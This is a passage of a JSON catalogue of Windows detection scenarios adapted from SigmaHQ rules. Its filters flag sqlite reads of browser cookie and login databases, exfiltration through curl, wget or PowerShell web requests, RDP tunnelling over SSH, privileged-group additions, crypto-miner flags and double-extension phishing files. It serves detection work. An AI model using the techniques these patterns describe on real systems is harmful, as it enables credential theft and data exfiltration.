'\\\\Opera Software\\\\' || evt.Parsed.CommandLine contains '\\\\ChromiumViewer\\\\') && (evt.Parsed.CommandLine contains 'Login Data' || evt.Parsed.CommandLine contains 'Cookies' || evt.Parsed.CommandLine contains 'Web Data' || evt.Parsed.CommandLine contains 'History' || evt.Parsed.CommandLine contains 'Bookmarks'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1539\n   - attack.t1555.003\n   - attack.t1005\n\n  label: \"SQLite Chromium Profile Data DB Access\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detect usage of the \"sqlite\" binary to query databases in Chromium-based browsers for potential data stealing.\n", "path": "scenarios/sigmahq/proc_creation_win_sqlite_chromium_profile_data.yml", "version": "0.2", "versions": {"0.1": {"digest": "bbc79c9056a566f98f730380825ab48ace4eb3e586edc19cd528cee409eaefed"}, "0.2": {"digest": "516713ad78d1a8035f21f97940e59177c67cd0289725bb4975104401a8d51974"}}}, "sigmahq/proc_creation_win_sqlite_firefox_gecko_profile_data": {"content": "type: trigger\nname: sigmahq/proc_creation_win_sqlite_firefox_gecko_profile_data\ndescription: |\n  Detect usage of the \"sqlite\" binary to query databases in Firefox and other Gecko-based browsers for potential data stealing.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Product == 'SQLite' || evt.Parsed.Image endsWith '\\\\sqlite.exe' || evt.Parsed.Image endsWith '\\\\sqlite3.exe') && (evt.Parsed.CommandLine contains 'cookies.sqlite' || evt.Parsed.CommandLine contains 'places.sqlite'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1539\n   - attack.t1005\n\n  label: \"SQLite Firefox Profile Data DB Access\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detect usage of the \"sqlite\" binary to query databases in Firefox and other Gecko-based browsers for potential data stealing.\n", "path": "scenarios/sigmahq/proc_creation_win_sqlite_firefox_gecko_profile_data.yml", "version": "0.2", "versions": {"0.1": {"digest": "2ebb441e5a199cb8885a9927c1d065382390100a7ee883f857e9a0462200f99f"}, "0.2": {"digest": "1c91ac936430c19300fded023c146e796857ae0c7a2d849d2a76ea8cd2b6e9e7"}}}, "sigmahq/proc_creation_win_ssh_rdp_tunneling": {"content": "type: trigger\nname: sigmahq/proc_creation_win_ssh_rdp_tunneling\ndescription: |\n  Execution of ssh.exe to perform data exfiltration and tunneling through RDP\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.Image endsWith '\\\\ssh.exe' && evt.Parsed.CommandLine contains ':3389')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1572\n\n  label: \"Potential RDP Tunneling Via SSH\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Execution of ssh.exe to perform data exfiltration and tunneling through RDP\n", "path": "scenarios/sigmahq/proc_creation_win_ssh_rdp_tunneling.yml", "version": "0.2", "versions": {"0.1": {"digest": "f07dbfe9ba7e8064f9e84196a0bfa10b0dac3d020fa5ca83b1ca11fc04e1ad3a"}, "0.2": {"digest": "312836b5012a341e4729d9567cc69aa01939c40a969db8b719f51e0b92a816d7"}}}, "sigmahq/proc_creation_win_stordiag_susp_child_process": {"content": "type: trigger\nname: sigmahq/proc_creation_win_stordiag_susp_child_process\ndescription: |\n  Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '\\\\stordiag.exe' && (evt.Parsed.Image endsWith '\\\\schtasks.exe' || evt.Parsed.Image endsWith '\\\\systeminfo.exe' || evt.Parsed.Image endsWith '\\\\fltmc.exe') && not (evt.Parsed.ParentImage startsWith 'c:\\\\windows\\\\system32\\\\' || evt.Parsed.ParentImage startsWith 'c:\\\\windows\\\\syswow64\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1218\n\n  label: \"Execution via stordiag.exe\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of stordiag.exe to execute schtasks.exe systeminfo.exe and fltmc.exe\n", "path": "scenarios/sigmahq/proc_creation_win_stordiag_susp_child_process.yml", "version": "0.2", "versions": {"0.1": {"digest": "1b9a65a609fe40fcacf4ceba64aba7e050c603a6059cd1fd627fa0f974117ee5"}, "0.2": {"digest": "227f727ad57acd85f67018261c2848d01f4cf0250a54f79cdb5a49612b7b4201"}}}, "sigmahq/proc_creation_win_susp_abusing_debug_privilege": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_abusing_debug_privilege\ndescription: |\n  Detection of unusual child processes by different system processes\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\winlogon.exe' || evt.Parsed.ParentImage endsWith '\\\\services.exe' || evt.Parsed.ParentImage endsWith '\\\\lsass.exe' || evt.Parsed.ParentImage endsWith '\\\\csrss.exe' || evt.Parsed.ParentImage endsWith '\\\\smss.exe' || evt.Parsed.ParentImage endsWith '\\\\wininit.exe' || evt.Parsed.ParentImage endsWith '\\\\spoolsv.exe' || evt.Parsed.ParentImage endsWith '\\\\searchindexer.exe') && (evt.Parsed.User contains 'AUTHORI' || evt.Parsed.User contains 'AUTORI') && (evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.OriginalFileName in ['PowerShell.EXE', 'pwsh.dll', 'Cmd.Exe']) && not (evt.Parsed.CommandLine contains ' route ' && evt.Parsed.CommandLine contains ' ADD '))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1548\n\n  label: \"Abused Debug Privilege by Arbitrary Parent Processes\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detection of unusual child processes by different system processes\n", "path": "scenarios/sigmahq/proc_creation_win_susp_abusing_debug_privilege.yml", "version": "0.2", "versions": {"0.1": {"digest": "f892d460f3872299987fc7ff4ed9a638298c03563b19d3dcdcae69e72547c772"}, "0.2": {"digest": "d99d06c84dc5889a083e36f16ddcd6bb69fc6837baee7335eba086d35fc04e73"}}}, "sigmahq/proc_creation_win_susp_add_user_privileged_group": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_add_user_privileged_group\ndescription: |\n  Detects addition of users to highly privileged groups via \"Net\" or \"Add-LocalGroupMember\".\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'localgroup ' && evt.Parsed.CommandLine contains ' /add' || evt.Parsed.CommandLine contains 'Add-LocalGroupMember ' && evt.Parsed.CommandLine contains ' -Group ') && (evt.Parsed.CommandLine contains 'Group Policy Creator Owners' || evt.Parsed.CommandLine contains 'Schema Admins'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1098\n\n  label: \"User Added To Highly Privileged Group\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects addition of users to highly privileged groups via \"Net\" or \"Add-LocalGroupMember\".\n", "path": "scenarios/sigmahq/proc_creation_win_susp_add_user_privileged_group.yml", "version": "0.2", "versions": {"0.1": {"digest": "e6571dbebb366899670529238cda39c335bd44f820b1270f3657a7518e8c9b03"}, "0.2": {"digest": "0458265844c0d08d2caaa65ef8c3cff85539480fd60e010b3e073a89050e5c8f"}}}, "sigmahq/proc_creation_win_susp_add_user_remote_desktop_group": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_add_user_remote_desktop_group\ndescription: |\n  Detects addition of users to the local Remote Desktop Users group via \"Net\" or \"Add-LocalGroupMember\".\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains 'localgroup ' && evt.Parsed.CommandLine contains ' /add' || evt.Parsed.CommandLine contains 'Add-LocalGroupMember ' && evt.Parsed.CommandLine contains ' -Group ') && (evt.Parsed.CommandLine contains 'Remote Desktop Users' || evt.Parsed.CommandLine contains 'Utilisateurs du Bureau \u00e0 distance' || evt.Parsed.CommandLine contains 'Usuarios de escritorio remoto'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1133\n   - attack.t1136.001\n   - attack.t1021.001\n\n  label: \"User Added to Remote Desktop Users Group\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects addition of users to the local Remote Desktop Users group via \"Net\" or \"Add-LocalGroupMember\".\n", "path": "scenarios/sigmahq/proc_creation_win_susp_add_user_remote_desktop_group.yml", "version": "0.2", "versions": {"0.1": {"digest": "3ac8d2af2f4b343be692a70a2570218d5f4bdee879f3691c1ad9ed288b0af892"}, "0.2": {"digest": "225015cc8b322982b6366c834d375b389196c2461386cc4e0f8598bb4a667f00"}}}, "sigmahq/proc_creation_win_susp_archiver_iso_phishing": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_archiver_iso_phishing\ndescription: |\n  Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web)\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentImage endsWith '\\\\Winrar.exe' || evt.Parsed.ParentImage endsWith '\\\\7zFM.exe' || evt.Parsed.ParentImage endsWith '\\\\peazip.exe') && (evt.Parsed.Image endsWith '\\\\isoburn.exe' || evt.Parsed.Image endsWith '\\\\PowerISO.exe' || evt.Parsed.Image endsWith '\\\\ImgBurn.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1566\n\n  label: \"Phishing Pattern ISO in Archive\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects cases in which an ISO files is opend within an archiver like 7Zip or Winrar, which is a sign of phishing as threat actors put small ISO files in archives as email attachments to bypass certain filters and protective measures (mark of web)\n", "path": "scenarios/sigmahq/proc_creation_win_susp_archiver_iso_phishing.yml", "version": "0.2", "versions": {"0.1": {"digest": "b2c631d94a8dbb8bc55999cd98e002036dcd60b640551c80f6fb3655e9553b19"}, "0.2": {"digest": "34213152599de01b40af2cf0a53c4d998388a8a529b775902b10774a278ec122"}}}, "sigmahq/proc_creation_win_susp_child_process_as_system_": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_child_process_as_system_\ndescription: |\n  Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE accounts\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.ParentUser contains 'AUTHORI' || evt.Parsed.ParentUser contains 'AUTORI') && (evt.Parsed.ParentUser endsWith '\\\\NETWORK SERVICE' || evt.Parsed.ParentUser endsWith '\\\\LOCAL SERVICE') && (evt.Parsed.User contains 'AUTHORI' || evt.Parsed.User contains 'AUTORI') && (evt.Parsed.User endsWith '\\\\SYSTEM' || evt.Parsed.User endsWith '\\\\Syst\u00e8me' || evt.Parsed.User endsWith '\\\\\u0421\u0418\u0421\u0422\u0415\u041c\u0410') && evt.Parsed.IntegrityLevel == 'System' && not (evt.Parsed.Image endsWith '\\\\rundll32.exe' && evt.Parsed.CommandLine contains 'DavSetCookie'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1134.002\n\n  label: \"Suspicious Child Process Created as System\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detection of child processes spawned with SYSTEM privileges by parents with LOCAL SERVICE or NETWORK SERVICE accounts\n", "path": "scenarios/sigmahq/proc_creation_win_susp_child_process_as_system_.yml", "version": "0.2", "versions": {"0.1": {"digest": "a0c8a09740b39864ba2924c3a4cbe847e46e2eb2f5112cbb4b2772be2cf56209"}, "0.2": {"digest": "488ea818a64d9ace4090fcd6bcba0d673cdf923f50df2a790e3deff65c1b90f5"}}}, "sigmahq/proc_creation_win_susp_cli_obfuscation_unicode_img": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_cli_obfuscation_unicode_img\ndescription: |\n  Detects potential commandline obfuscation using unicode characters. Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cmd.exe' || evt.Parsed.Image endsWith '\\\\cscript.exe' || evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\wscript.exe') && (evt.Parsed.OriginalFileName in ['Cmd.EXE', 'cscript.exe', 'PowerShell.EXE', 'pwsh.dll', 'wscript.exe']) && (evt.Parsed.CommandLine contains '\u02e3' || evt.Parsed.CommandLine contains '\u02ea' || evt.Parsed.CommandLine contains '\u02e2' || evt.Parsed.CommandLine contains '\u2215' || evt.Parsed.CommandLine contains '\u2044' || evt.Parsed.CommandLine contains '\u2015' || evt.Parsed.CommandLine contains '\u2014' || evt.Parsed.CommandLine contains '\u00a0' || evt.Parsed.CommandLine contains '\u00af' || evt.Parsed.CommandLine contains '\u00ae' || evt.Parsed.CommandLine contains '\u00b6'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1027\n\n  label: \"Potential CommandLine Obfuscation Using Unicode Characters From Suspicious Image\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects potential commandline obfuscation using unicode characters. Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. \n", "path": "scenarios/sigmahq/proc_creation_win_susp_cli_obfuscation_unicode_img.yml", "version": "0.2", "versions": {"0.1": {"digest": "8186510d9f6269e0b765a91a70b507bb5a8b060f6eae1153bc5d4548ceb77d4b"}, "0.2": {"digest": "22e1af02096e63b32c53893a2b85fb920ef4f7a9775b02815fb2db4c5d34a5c0"}}}, "sigmahq/proc_creation_win_susp_copy_system_dir_lolbin": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_copy_system_dir_lolbin\ndescription: |\n  Detects a suspicious copy operation that tries to copy a known LOLBIN from system (System32, SysWOW64, WinSxS) directories to another on disk in order to bypass detections based on locations. \nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '\\\\cmd.exe' && evt.Parsed.CommandLine contains 'copy ' || (evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe') && (evt.Parsed.CommandLine contains 'copy-item' || evt.Parsed.CommandLine contains ' copy ' || evt.Parsed.CommandLine contains 'cpi ' || evt.Parsed.CommandLine contains ' cp ') || evt.Parsed.Image endsWith '\\\\robocopy.exe' || evt.Parsed.Image endsWith '\\\\xcopy.exe' || evt.Parsed.OriginalFileName in ['robocopy.exe', 'XCOPY.EXE']) && (evt.Parsed.CommandLine contains '\\\\System32' || evt.Parsed.CommandLine contains '\\\\SysWOW64' || evt.Parsed.CommandLine contains '\\\\WinSxS') && (evt.Parsed.CommandLine contains '\\\\bitsadmin.exe' || evt.Parsed.CommandLine contains '\\\\calc.exe' || evt.Parsed.CommandLine contains '\\\\certutil.exe' || evt.Parsed.CommandLine contains '\\\\cmdl32.exe' || evt.Parsed.CommandLine contains '\\\\cscript.exe' || evt.Parsed.CommandLine contains '\\\\mshta.exe' || evt.Parsed.CommandLine contains '\\\\rundll32.exe' || evt.Parsed.CommandLine contains '\\\\wscript.exe'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036.003\n\n  label: \"LOL-Binary Copied From System Directory\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects a suspicious copy operation that tries to copy a known LOLBIN from system (System32, SysWOW64, WinSxS) directories to another on disk in order to bypass detections based on locations. \n", "path": "scenarios/sigmahq/proc_creation_win_susp_copy_system_dir_lolbin.yml", "version": "0.2", "versions": {"0.1": {"digest": "6d8bbd234cf9102a71afd381bee171795984d3914255da61744ee055c41dc941"}, "0.2": {"digest": "5d7c64649107dc734d0ce0c6b0dc3161acfa947799a3015db818f482eea3e441"}}}, "sigmahq/proc_creation_win_susp_crypto_mining_monero": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_crypto_mining_monero\ndescription: |\n  Detects command line parameters or strings often used by crypto miners\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.CommandLine contains ' --cpu-priority=' || evt.Parsed.CommandLine contains '--donate-level=0' || evt.Parsed.CommandLine contains ' -o pool.' || evt.Parsed.CommandLine contains ' --nicehash' || evt.Parsed.CommandLine contains ' --algo=rx/0 ' || evt.Parsed.CommandLine contains 'stratum+tcp://' || evt.Parsed.CommandLine contains 'stratum+udp://' || evt.Parsed.CommandLine contains 'LS1kb25hdGUtbGV2ZWw9' || evt.Parsed.CommandLine contains '0tZG9uYXRlLWxldmVsP' || evt.Parsed.CommandLine contains 'tLWRvbmF0ZS1sZXZlbD' || evt.Parsed.CommandLine contains 'c3RyYXR1bSt0Y3A6Ly' || evt.Parsed.CommandLine contains 'N0cmF0dW0rdGNwOi8v' || evt.Parsed.CommandLine contains 'zdHJhdHVtK3RjcDovL' || evt.Parsed.CommandLine contains 'c3RyYXR1bSt1ZHA6Ly' || evt.Parsed.CommandLine contains 'N0cmF0dW0rdWRwOi8v' || evt.Parsed.CommandLine contains 'zdHJhdHVtK3VkcDovL') && not (evt.Parsed.CommandLine contains ' pool.c ' || evt.Parsed.CommandLine contains ' pool.o ' || evt.Parsed.CommandLine contains 'gcc -'))\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1496\n\n  label: \"Potential Crypto Mining Activity\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects command line parameters or strings often used by crypto miners\n", "path": "scenarios/sigmahq/proc_creation_win_susp_crypto_mining_monero.yml", "version": "0.2", "versions": {"0.1": {"digest": "e94e31ec70d73c1978ea01ed1954a2a0c63c4d289928cf1eed885fc84438e3e8"}, "0.2": {"digest": "da7d320ee320ba17fef6469e39ba3afac1d3112f16af8a99026c8fc006c76a46"}}}, "sigmahq/proc_creation_win_susp_data_exfiltration_via_cli": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_data_exfiltration_via_cli\ndescription: |\n  Detects the use of various CLI utilities exfiltrating data via web requests\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (((evt.Parsed.Image endsWith '\\\\powershell.exe' || evt.Parsed.Image endsWith '\\\\pwsh.exe' || evt.Parsed.Image endsWith '\\\\cmd.exe') && (evt.Parsed.CommandLine contains 'Invoke-WebRequest' || evt.Parsed.CommandLine contains 'iwr ' || evt.Parsed.CommandLine contains 'wget ' || evt.Parsed.CommandLine contains 'curl ') && evt.Parsed.CommandLine contains ' -ur' && evt.Parsed.CommandLine contains ' -me' && evt.Parsed.CommandLine contains ' -b' && evt.Parsed.CommandLine contains ' POST ' || evt.Parsed.Image endsWith '\\\\curl.exe' && evt.Parsed.CommandLine contains '--ur' && (evt.Parsed.CommandLine contains ' -d ' || evt.Parsed.CommandLine contains ' --data ') || evt.Parsed.Image endsWith '\\\\wget.exe' && (evt.Parsed.CommandLine contains '--post-data' || evt.Parsed.CommandLine contains '--post-file')) && (evt.Parsed.CommandLine contains 'Get-Content' || evt.Parsed.CommandLine contains 'GetBytes' || evt.Parsed.CommandLine contains 'hostname' || evt.Parsed.CommandLine contains 'ifconfig' || evt.Parsed.CommandLine contains 'ipconfig' || evt.Parsed.CommandLine contains 'net view' || evt.Parsed.CommandLine contains 'netstat' || evt.Parsed.CommandLine contains 'nltest' || evt.Parsed.CommandLine contains 'qprocess' || evt.Parsed.CommandLine contains 'sc query' || evt.Parsed.CommandLine contains 'systeminfo' || evt.Parsed.CommandLine contains 'tasklist' || evt.Parsed.CommandLine contains 'ToBase64String' || evt.Parsed.CommandLine contains 'whoami' || evt.Parsed.CommandLine contains 'type ' && evt.Parsed.CommandLine contains ' > ' && evt.Parsed.CommandLine contains ' C:\\\\'))\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1059.001\n\n  label: \"Potential Data Exfiltration Activity Via CommandLine Tools\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the use of various CLI utilities exfiltrating data via web requests\n", "path": "scenarios/sigmahq/proc_creation_win_susp_data_exfiltration_via_cli.yml", "version": "0.2", "versions": {"0.1": {"digest": "06a7b80b78cfa54c3d23b196e241f7181d55c8f175794ff0170f8535bd955ea1"}, "0.2": {"digest": "c1773aeb62510007ad999f3823bdf7a2efa4c5ecb0b37a4a1454d7a3d505c38b"}}}, "sigmahq/proc_creation_win_susp_disable_raccine": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_disable_raccine\ndescription: |\n  Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains 'taskkill ' && evt.Parsed.CommandLine contains 'RaccineSettings.exe' || evt.Parsed.CommandLine contains 'reg.exe' && evt.Parsed.CommandLine contains 'delete' && evt.Parsed.CommandLine contains 'Raccine Tray' || evt.Parsed.CommandLine contains 'schtasks' && evt.Parsed.CommandLine contains '/DELETE' && evt.Parsed.CommandLine contains 'Raccine Rules Updater')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1562.001\n\n  label: \"Raccine Uninstall\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects commands that indicate a Raccine removal from an end system. Raccine is a free ransomware protection tool.\n", "path": "scenarios/sigmahq/proc_creation_win_susp_disable_raccine.yml", "version": "0.2", "versions": {"0.1": {"digest": "b30d8c4c5ab0dcdb8054d87d3268f231898c261b5a6c4b40c1dde8fe193b2a0c"}, "0.2": {"digest": "34d6f181d40b3fe52bfe1bd689d5a590bb503fb3cbd02a0f3faced08a30babef"}}}, "sigmahq/proc_creation_win_susp_double_extension": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_double_extension\ndescription: |\n  Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && ((evt.Parsed.Image endsWith '.doc.exe' || evt.Parsed.Image endsWith '.docx.exe' || evt.Parsed.Image endsWith '.xls.exe' || evt.Parsed.Image endsWith '.xlsx.exe' || evt.Parsed.Image endsWith '.ppt.exe' || evt.Parsed.Image endsWith '.pptx.exe' || evt.Parsed.Image endsWith '.rtf.exe' || evt.Parsed.Image endsWith '.pdf.exe' || evt.Parsed.Image endsWith '.txt.exe' || evt.Parsed.Image endsWith '      .exe' || evt.Parsed.Image endsWith '______.exe' || evt.Parsed.Image endsWith '.doc.js' || evt.Parsed.Image endsWith '.docx.js' || evt.Parsed.Image endsWith '.xls.js' || evt.Parsed.Image endsWith '.xlsx.js' || evt.Parsed.Image endsWith '.ppt.js' || evt.Parsed.Image endsWith '.pptx.js' || evt.Parsed.Image endsWith '.rtf.js' || evt.Parsed.Image endsWith '.pdf.js' || evt.Parsed.Image endsWith '.txt.js') && (evt.Parsed.CommandLine contains '.doc.exe' || evt.Parsed.CommandLine contains '.docx.exe' || evt.Parsed.CommandLine contains '.xls.exe' || evt.Parsed.CommandLine contains '.xlsx.exe' || evt.Parsed.CommandLine contains '.ppt.exe' || evt.Parsed.CommandLine contains '.pptx.exe' || evt.Parsed.CommandLine contains '.rtf.exe' || evt.Parsed.CommandLine contains '.pdf.exe' || evt.Parsed.CommandLine contains '.txt.exe' || evt.Parsed.CommandLine contains '      .exe' || evt.Parsed.CommandLine contains '______.exe' || evt.Parsed.CommandLine contains '.doc.js' || evt.Parsed.CommandLine contains '.docx.js' || evt.Parsed.CommandLine contains '.xls.js' || evt.Parsed.CommandLine contains '.xlsx.js' || evt.Parsed.CommandLine contains '.ppt.js' || evt.Parsed.CommandLine contains '.pptx.js' || evt.Parsed.CommandLine contains '.rtf.js' || evt.Parsed.CommandLine contains '.pdf.js' || evt.Parsed.CommandLine contains '.txt.js'))\nblackhole: 2m\n#status: stable\nlabels:\n  service: windows\n  confidence: 2\n  spoofable: 0\n  classification:\n   - attack.t1566.001\n\n  label: \"Suspicious Double Extension File Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects suspicious use of an .exe extension after a non-executable file extension like .pdf.exe, a set of spaces or underlines to cloak the executable file in spear phishing campaigns\n", "path": "scenarios/sigmahq/proc_creation_win_susp_double_extension.yml", "version": "0.2", "versions": {"0.1": {"digest": "49a60a22ae1b7dba8992b0729d0d0171d148e879726b295bc4251b7dfe7d7da8"}, "0.2": {"digest": "85edac7674df60e59291b26fe25ae4316f7e75673f45ded3a544010b9b1125c4"}}}, "sigmahq/proc_creation_win_susp_double_extension_parent": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_double_extension_parent\ndescription: |\n  Detect execution of suspicious double extension files in ParentCommandLine\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.ParentImage endsWith '.doc.lnk' || evt.Parsed.ParentImage endsWith '.docx.lnk' || evt.Parsed.ParentImage endsWith '.xls.lnk' || evt.Parsed.ParentImage endsWith '.xlsx.lnk' || evt.Parsed.ParentImage endsWith '.ppt.lnk' || evt.Parsed.ParentImage endsWith '.pptx.lnk' || evt.Parsed.ParentImage endsWith '.rtf.lnk' || evt.Parsed.ParentImage endsWith '.pdf.lnk' || evt.Parsed.ParentImage endsWith '.txt.lnk' || evt.Parsed.ParentImage endsWith '.doc.js' || evt.Parsed.ParentImage endsWith '.docx.js' || evt.Parsed.ParentImage endsWith '.xls.js' || evt.Parsed.ParentImage endsWith '.xlsx.js' || evt.Parsed.ParentImage endsWith '.ppt.js' || evt.Parsed.ParentImage endsWith '.pptx.js' || evt.Parsed.ParentImage endsWith '.rtf.js' || evt.Parsed.ParentImage endsWith '.pdf.js' || evt.Parsed.ParentImage endsWith '.txt.js' || evt.Parsed.ParentCommandLine contains '.doc.lnk' || evt.Parsed.ParentCommandLine contains '.docx.lnk' || evt.Parsed.ParentCommandLine contains '.xls.lnk' || evt.Parsed.ParentCommandLine contains '.xlsx.lnk' || evt.Parsed.ParentCommandLine contains '.ppt.lnk' || evt.Parsed.ParentCommandLine contains '.pptx.lnk' || evt.Parsed.ParentCommandLine contains '.rtf.lnk' || evt.Parsed.ParentCommandLine contains '.pdf.lnk' || evt.Parsed.ParentCommandLine contains '.txt.lnk' || evt.Parsed.ParentCommandLine contains '.doc.js' || evt.Parsed.ParentCommandLine contains '.docx.js' || evt.Parsed.ParentCommandLine contains '.xls.js' || evt.Parsed.ParentCommandLine contains '.xlsx.js' || evt.Parsed.ParentCommandLine contains '.ppt.js' || evt.Parsed.ParentCommandLine contains '.pptx.js' || evt.Parsed.ParentCommandLine contains '.rtf.js' || evt.Parsed.ParentCommandLine contains '.pdf.js' || evt.Parsed.ParentCommandLine contains '.txt.js')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n   - attack.t1036.007\n\n  label: \"Suspicious Parent Double Extension File Execution\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detect execution of suspicious double extension files in ParentCommandLine\n", "path": "scenarios/sigmahq/proc_creation_win_susp_double_extension_parent.yml", "version": "0.2", "versions": {"0.1": {"digest": "5757b41ac771943f19b24d595809ead073b26da627d5350a5ad1e459da0aa315"}, "0.2": 